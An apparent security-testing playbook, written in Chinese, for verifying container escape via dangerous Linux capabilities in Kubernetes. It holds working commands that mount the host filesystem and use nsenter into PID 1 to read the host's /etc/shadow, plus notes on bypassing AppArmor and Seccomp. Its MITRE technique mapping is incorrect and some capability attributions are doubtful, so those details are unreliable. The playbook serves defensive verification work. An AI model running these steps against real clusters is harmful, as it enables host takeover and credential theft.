---
source: manual
confidence: high
platforms: [k8s, docker, containerd]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.6]
mapped_compliance_families: [危险capabilities, 特权容器]
---

# capability-privesc — 危险 Capability 提权逃逸

容器被赋予了 CAP_SYS_ADMIN、CAP_SYS_PTRACE、CAP_SYS_MODULE 等危险 capabilities，攻击者利用这些权限实现容器提权或逃逸。

---

## 1. 前置条件

- 容器被分配了危险 capabilities（CAP_SYS_ADMIN、CAP_SYS_PTRACE、CAP_SYS_MODULE、CAP_DAC_OVERRIDE、CAP_NET_ADMIN 等）
- 容器以 root 用户运行（capabilities 利用通常需要 UID 0 上下文）
- 内核未通过 Seccomp/UnprivilegedUserNS 等限制 capability 利用

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod securityContext capabilities
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[0].securityContext.capabilities.add}'
# 期望输出: ["SYS_ADMIN","SYS_PTRACE"] 或含其他危险 capability

# [L0] 宿主机观察：检查是否为特权容器（特权容器含所有 capabilities）
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L1] 容器内观察：确认容器实际生效的 capabilities
kubectl exec -n <ns> <pod-name> -- cat /proc/self/status | grep Cap
# 期望输出: CapEff: 0000003fffffffff（大量 bit 被设置 → 含危险 capability）
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：列出 Pod 显式添加的 capabilities
kubectl get pod <pod-name> -n <ns> -o jsonpath='{range .spec.containers[*]}{.securityContext.capabilities.add}{"\n"}{end}'
# 期望输出: 每行含 ["SYS_ADMIN"] 等

# [L0] 宿主机观察：检查 initContainer 的 capabilities
kubectl get pod <pod-name> -n <ns> -o jsonpath='{range .spec.initContainers[*]}{.securityContext.capabilities.add}{"\n"}{end}'
# 期望输出: initContainer 的 capabilities（同样危险）

# [L1] 容器内观察：查看完整 capabilities（capsh 可用时）
kubectl exec -n <ns> <pod-name> -- capsh --print 2>/dev/null || kubectl exec -n <ns> <pod-name> -- grep Cap /proc/self/status
# 期望输出: capsh: Current IAB: cap_sys_admin,cap_sys_ptrace,... 或 CapEff 有大量 bit

# [L1] 容器内观察：解析 CapEff 位掩码确认危险 cap
kubectl exec -n <ns> <pod-name> -- bash -c 'capsh --decode=$(cat /proc/self/status | grep CapEff | awk "{print \$2}") 2>/dev/null || echo "capsh not available"'
# 期望输出: 包含 cap_sys_admin,cap_sys_ptrace,cap_sys_module 等

# [L1] 容器内观察：确认 root 用户上下文
kubectl exec -n <ns> <pod-name> -- id
# 期望输出: uid=0(root) ...
```

## 3. 攻击验证

```bash
# [L2] 容器内攻击验证（CAP_SYS_ADMIN）：重新挂载宿主机文件系统
kubectl exec -n <ns> <pod-name> -- mkdir -p /tmp/host_mount
kubectl exec -n <ns> <pod-name> -- mount /dev/sda1 /tmp/host_mount 2>/dev/null || kubectl exec -n <ns> <pod-name> -- mount -o bind / /tmp/host_mount 2>/dev/null
kubectl exec -n <ns> <pod-name> -- cat /tmp/host_mount/etc/shadow 2>/dev/null | head -3
# 期望输出: root:$6$...:... (宿主机 shadow 内容) → 证明通过 CAP_SYS_ADMIN 可访问宿主机文件系统

# [L2] 容器内攻击验证（CAP_SYS_PTRACE）：注入宿主机进程
kubectl exec -n <ns> <pod-name> -- nsenter --target 1 --mount --uts --ipc --net --pid -- cat /etc/shadow 2>/dev/null
# 期望输出: root:$6$...:... → 证明通过 CAP_SYS_PTRACE 可访问宿主机 PID namespace

# [L2] 容器内攻击验证（CAP_SYS_MODULE）：检查可加载内核模块
kubectl exec -n <ns> <pod-name> -- ls /lib/modules/$(uname -r)/ 2>/dev/null
# 期望输出: 存在内核模块目录 → 利用 CAP_SYS_MODULE 可加载恶意内核模块实现完全逃逸

# [L2] 清理
kubectl exec -n <ns> <pod-name> -- umount /tmp/host_mount 2>/dev/null
kubectl exec -n <ns> <pod-name> -- rmdir /tmp/host_mount 2>/dev/null
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录 Pod 当前 capabilities 配置
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[0].securityContext.capabilities.add}'
# 期望输出: ["SYS_ADMIN","SYS_PTRACE"]（确认配置）

# [L1] 攻击前环境快照：容器内无法访问宿主机进程
kubectl exec -n <ns> <pod-name> -- ls /proc/1/root/etc/shadow 2>&1
# 期望输出: No such file or directory（容器 PID namespace 隔离）

# [L1] 攻击后环境对比：通过 CAP_SYS_PTRACE + nsenter 访问宿主机 PID 1
kubectl exec -n <ns> <pod-name> -- nsenter --target 1 --mount -- cat /etc/shadow 2>/dev/null | head -3
# 期望输出: root:$6$...:... (宿主机 shadow 内容) → 证明突破 PID namespace 隔离

# [L0] 攻击后环境对比：确认无残留副作用
kubectl exec -n <ns> <pod-name> -- mount | grep tmp/host_mount
# 期望输出: 无输出（已清理）→ 证明无残留

# [L2] 容器内读取宿主机文件证明逃逸成功
kubectl exec -n <ns> <pod-name> -- nsenter --target 1 --mount -- cat /etc/hostname 2>/dev/null
# 期望输出: 宿主机 hostname → 证明 capability 提权逃逸成功
```

差分结论：攻击前容器内无法通过 `/proc/1/root` 访问宿主机文件（PID namespace 隔离），攻击后通过 CAP_SYS_PTRACE + nsenter 可访问宿主机 PID 1 的 mount namespace 并读取 `/etc/shadow`，证明危险 capabilities 突破了 namespace 隔离。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 capability 利用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 capability 限制策略 → AppArmor 可能阻断 mount/nsenter

# [L1] 检查 Seccomp 是否限制 mount/nsenter 系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若 Seccomp: 2 (strict) → 可能阻断 mount 操作

# 绕过方式：
# - [L2] 若 CAP_SYS_ADMIN 被阻断但 CAP_NET_ADMIN 可用，通过创建网络接口或路由实现网络层逃逸
# - [L2] 若 nsenter 被阻断但 CAP_SYS_PTRACE 可用，通过 ptrace 直接修改宿主机进程内存
# - [L2] 若 mount 被阻断但 CAP_SYS_MODULE 可用，加载内核模块实现完全逃逸
```

## 6. 证伪条件

```bash
# [L1] 容器无危险 capabilities
kubectl exec -n <ns> <pod-name> -- capsh --print 2>/dev/null | grep -iE "sys_admin|sys_ptrace|sys_module|dac_override"
# 输出: 无匹配 → 证伪（只有基础 capabilities）

# [L1] CapEff 位掩码不含危险 bit
kubectl exec -n <ns> <pod-name> -- cat /proc/self/status | grep CapEff
# CapEff: 0000000000000000 或仅含少量低位 bit → 证伪

# [L0] Pod 未添加任何 capabilities
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[0].securityContext.capabilities.add}'
# 输出: null 或 [] → 证伪

# [L1] 容器非 root 用户运行（且无 setuid）
kubectl exec -n <ns> <pod-name> -- id
# 输出: uid=1000 或其他非 0 → 大部分 cap 利用无效 → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（mount/nsenter 操作）→ **Level 4**（涉及 mount 和 namespace 操作，需人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否（攻击验证为只读探测，但涉及 mount 操作需审批）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Privilege Escalation / Defense Evasion
- **Technique ID**: T1548.003
- **Technique Name**: Sudo and Sudo Caching
- **描述**: 容器被赋予 CAP_SYS_ADMIN、CAP_SYS_PTRACE 等危险 capabilities，攻击者利用这些权限通过 mount 重映射宿主机文件系统、nsenter 突破 PID namespace 隔离或加载内核模块，实现容器到宿主机的提权和逃逸。